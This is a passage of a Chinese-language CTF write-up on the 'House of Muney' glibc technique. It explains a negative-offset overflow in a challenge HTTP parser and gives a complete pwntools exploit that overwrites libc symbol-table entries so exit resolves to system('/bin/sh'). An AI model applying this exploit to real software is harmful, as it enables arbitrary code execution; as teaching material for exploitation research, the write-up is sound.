class="hljs-string">&quot;Host&quot;</span>, *v24) == <span class="hljs-number">0</span>;<br>    &#125;<br>    ++v23;<br>  &#125;<br>  *v16 = <span class="hljs-number">0</span>;<br>  v17 = v16 + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( *v17 == <span class="hljs-number">10</span> )<br>    *v17++ = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a3 != <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">goto</span> LABEL_126;<br>  <span class="hljs-keyword">if</span> ( !a2[<span class="hljs-number">313</span>] &amp;&amp; !a2[<span class="hljs-number">312</span>] )<br>  &#123;<br>    a2[<span class="hljs-number">313</span>] = *(_BYTE *)(*((_QWORD *)a2 + <span class="hljs-number">3</span>) + <span class="hljs-number">7LL</span>) != <span class="hljs-number">48</span>;<br>    a2[<span class="hljs-number">312</span>] = a2[<span class="hljs-number">313</span>] == <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(_BYTE *)(*((_QWORD *)a2 + <span class="hljs-number">3</span>) + <span class="hljs-number">7LL</span>) == <span class="hljs-number">49</span> &amp;&amp; !v22 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>LABEL_126:<br>  *((_QWORD *)a2 + <span class="hljs-number">38</span>) = v17;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>主要就是对输入的解析，可知要以http请求头的格式来输入，格式如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">content</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;HTTP_Parser&gt; &#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span><br>    menu(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, length, content</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /edit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span></span><br><span class="hljs-string">Offset: <span class="hljs-subst">&#123;offset&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header.encode() + content<br><br>    menu(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /delete HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /quit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>再看到“create”的规则<br class='item-img' data-src='/2024/05/17/house-of-muney/create.png'><img src="/2024/05/17/house-of-muney/create.png"><br>发现申请的堆块最小为0x100000，因此我们申请的堆块都会走mmap。mmap申请的内存一般位于libc.so.6内存的低地址处。如果可以修改mmap申请的这段内存的size，那么我们再次申请回来就可以覆盖掉libc.so.6的符号表</p>
<p>edit函数里发现了一处漏洞：<br class='item-img' data-src='/2024/05/17/house-of-muney/overflow.png'><img src="/2024/05/17/house-of-muney/overflow.png"><br>这里没有对负数进行检查，edit可以向低地址方向写入数据。</p>
<p>因此，先申请一个堆块，再利用edit中的洞修改其size，free掉该堆块后再次申请它，就能造成任意写</p>
<p>有一处exit(“&#x2F;bin&#x2F;sh”)<br class='item-img' data-src='/2024/05/17/house-of-muney/binsh.png'><img src="/2024/05/17/house-of-muney/binsh.png"><br></p>
<p>可以劫持函数解析，将exit解析为system即可实现syste(“&#x2F;bin&#x2F;sh”)</p>
<p>接下来去找那几个需要伪造的值的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bitmask_word<br>bucket<br>hasharr<br>target symbol -&gt;st_value<br></code></pre></td></tr></table></figure>
<p>使用glibc源码级的调试，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, p16, p8<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./muney&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><br>p = process([<span class="hljs-string">&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;</span>,<span class="hljs-string">&quot;./muney&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>&#125;)<br><br><span class="hljs-comment">#p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./sys1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">content</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;HTTP_Parser&gt; &#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p, s)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /quit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br>cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf</span><br><span class="hljs-string">b do_lookup_x</span><br><span class="hljs-string">b exit</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>debug(cmd)<br><br>quit()<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p>这个位置的while (++i &lt; n);需要先过一次<br class='item-img' data-src='/2024/05/17/house-of-muney/while.png'><img src="/2024/05/17/house-of-muney/while.png"><br>然后开始找那几个值<br class='item-img' data-src='/2024/05/17/house-of-muney/bitmask.png'><img src="/2024/05/17/house-of-muney/bitmask.png"><br><br class='item-img' data-src='/2024/05/17/house-of-muney/bucket.png'><img src="/2024/05/17/house-of-muney/bucket.png"><br><br class='item-img' data-src='/2024/05/17/house-of-muney/hasharr.png'><img src="/2024/05/17/house-of-muney/hasharr.png"><br></p>
<p>还需要找到system的st_value和st_name,还是用这个简单的程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc sys1.c -fno-pie -g -o sys1</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> *buff;<br>read(<span class="hljs-number">0</span>,buff,<span class="hljs-number">0x15</span>);<span class="hljs-comment">//为了让程序长一点好下断点</span><br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p><br class='item-img' data-src='/2024/05/17/house-of-muney/sym1.png'><img src="/2024/05/17/house-of-muney/sym1.png"><br class='item-img' data-src='/2024/05/17/house-of-muney/sys.png'><img src="/2024/05/17/house-of-muney/sys.png"><br></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, p16, p8<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./muney&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><br>p = process([<span class="hljs-string">&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;</span>,<span class="hljs-string">&quot;./muney&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p, s)<br>    pause()<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">content</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;HTTP_Parser&gt; &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, length, content</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /edit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span></span><br><span class="hljs-string">Offset: <span class="hljs-subst">&#123;offset&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header.encode() + content<br><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /delete HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /quit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br>command = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf</span><br><span class="hljs-string">dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf</span><br><span class="hljs-string">dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf/dl-lookup.c</span><br><span class="hljs-string">b *0x4021CA</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>debug(command)<br><br><span class="hljs-comment"># quit()</span><br><br>bitmask_offset = <span class="hljs-number">0xb88</span><br>bucket_offset = <span class="hljs-number">0xcb0</span><br>hasharr_offset = <span class="hljs-number">0x1d7c</span><br>exit_sym_offset = <span class="hljs-number">0x4d20</span><br><br>bitmask_word = <span class="hljs-number">0xf000028c0200130e</span><br>bucket = <span class="hljs-number">0x86</span><br>hasharr = <span class="hljs-number">0x7c967e3e7c93f2a0</span><br>exit_sym = <span class="hljs-number">0x000f001200002efb</span><br><br>st_value = <span class="hljs-number">0x52290</span>  <span class="hljs-comment"># system offset libc base</span><br><br>add(<span class="hljs-number">0x200000</span>)<br>edit(<span class="hljs-number">0</span>, -<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x02\x10\x21&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x211002</span>)<br><br>mmap_offset_libc = <span class="hljs-number">0x201ff0</span><br><br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + bitmask_offset, <span class="hljs-number">2</span>, p16(bitmask_word &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + bitmask_offset + <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + bitmask_offset + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">40</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + bitmask_offset + <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">56</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + bucket_offset, <span class="hljs-number">1</span>, p8(bucket))<br><br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + hasharr_offset, <span class="hljs-number">8</span>, p64(hasharr))<br><br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p16(exit_sym &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">32</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">48</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, mmap_offset_libc + exit_sym_offset, <span class="hljs-number">3</span>, p32(st_value)[:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># dbg()</span><br><br>quit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/05/07/%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4/">侧信道爆破 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>